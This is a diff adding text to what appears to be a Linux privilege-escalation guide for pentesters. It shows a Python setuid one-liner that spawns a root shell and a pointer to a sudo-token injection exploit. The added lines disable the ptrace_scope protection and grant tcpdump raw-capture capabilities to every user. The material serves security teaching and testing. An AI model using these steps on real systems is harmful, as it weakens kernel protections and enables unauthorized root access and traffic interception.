@@ -798,6 +798,8 @@ Requirements to escalate privileges:
 * `cat /proc/sys/kernel/yama/ptrace_scope` is 0
 * `gdb` is accessible \(you can be able to upload it\)
 
+\(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`\)
+
 If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo_inject)\*\*\*\*
 
 * The **first exploit** \(`exploit.sh`\) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session**:
@@ -1011,6 +1013,14 @@ getcap -r / 2>/dev/null
 
 #Exploit
 /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash");'
+```
+
+**Capabilities** needed by `tcpdump` to allow any user to sniff packets:
+
+```bash
+setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
+getcap /usr/sbin/tcpdump
+/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
 ```
 
 ### The special case of "empty" capabilities
